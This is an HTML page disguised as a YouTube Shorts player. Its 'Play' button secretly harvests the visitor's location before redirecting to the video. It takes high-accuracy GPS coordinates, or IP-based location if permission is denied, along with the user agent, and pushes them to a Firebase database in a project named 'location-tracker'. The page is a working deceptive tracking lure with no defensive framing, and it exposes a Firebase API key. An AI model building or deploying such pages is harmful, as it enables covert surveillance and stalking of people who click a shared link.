<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>YouTube Shorts - Accurate Location</title>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <style>
    body { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: Arial; text-align: center; }
    button { padding: 12px 20px; font-size: 18px; font-weight: bold; color: white; background: #ff0000; border: none; border-radius: 8px; cursor: pointer; }
    #status { margin-top: 15px; font-size: 16px; font-weight: bold; color: #007bff; }
  </style>
</head>
<body>
  <h2>Watch on YouTube</h2>
  <button id="playBtn">‚ñ∂Ô∏è Play on YouTube</button>
  <p id="status"></p>

  <script>
    const youtubeLink = "https://www.youtube.com/shorts/KedF7uEjiTs";

    const firebaseConfig = {
      apiKey: "AIzaSyBlvUQ7EpySZ-4lvbWuKOan7XSrNvTHIq8",
      authDomain: "location-tracker-d10ec.firebaseapp.com",
      databaseURL: "https://location-tracker-d10ec-default-rtdb.firebaseio.com",
      projectId: "location-tracker-d10ec",
      storageBucket: "location-tracker-d10ec.firebasestorage.app",
      messagingSenderId: "111876457066",
      appId: "1:111876457066:web:78c76e424dff3dbcae8013"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const playBtn = document.getElementById("playBtn");
    const statusEl = document.getElementById("status");

    function saveLocation(lat, lon, accuracy) {
      const payload = {
        event: "button_clicked",
        timestamp: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        latitude: lat,
        longitude: lon,
        accuracy: accuracy,
        videoUrl: youtubeLink
      };
      return database.ref("visitors").push(payload);
    }

    async function getIPLocation() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        return {
          latitude: data.latitude || "N/A",
          longitude: data.longitude || "N/A",
          accuracy: "IP-based"
        };
      } catch {
        return { latitude: "N/A", longitude: "N/A", accuracy: "unknown" };
      }
    }

    playBtn.addEventListener("click", () => {
      statusEl.textContent = "üé¨ Video will play in 3 seconds...";
      
      if (navigator.geolocation) {
        let attempts = 0;
        const maxAttempts = 5;

        const watchId = navigator.geolocation.watchPosition(
          async (pos) => {
            attempts++;
            console.log(`Attempt ${attempts}: Accuracy = ${pos.coords.accuracy} meters`);
            statusEl.textContent = `üéØ GPS accuracy: ${Math.round(pos.coords.accuracy)}m`;

            // Check if accuracy is acceptable or max attempts reached
            if (pos.coords.accuracy <= 100 || attempts >= maxAttempts) {
              navigator.geolocation.clearWatch(watchId);
              await saveLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
              statusEl.textContent = "‚úÖ Location saved! Video will play in 3 seconds...";
              setTimeout(() => { window.location.href = youtubeLink; }, 3000);
            }
          },
          async () => {
            // Permission denied or error ‚Üí fallback to IP
            const ipLoc = await getIPLocation();
            await saveLocation(ipLoc.latitude, ipLoc.longitude, ipLoc.accuracy);
            statusEl.textContent = "‚ö†Ô∏è Permission denied or GPS unavailable. Video will play in 3 seconds...";
            setTimeout(() => { window.location.href = youtubeLink; }, 3000);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );

      } else {
        // Browser does not support geolocation ‚Üí fallback to IP
        getIPLocation().then(ipLoc => {
          saveLocation(ipLoc.latitude, ipLoc.longitude, ipLoc.accuracy);
          statusEl.textContent = "‚ö†Ô∏è Geolocation not supported. Video will play in 3 seconds...";
          setTimeout(() => { window.location.href = youtubeLink; }, 3000);
        });
      }
    });
  </script>
</body>
</html>
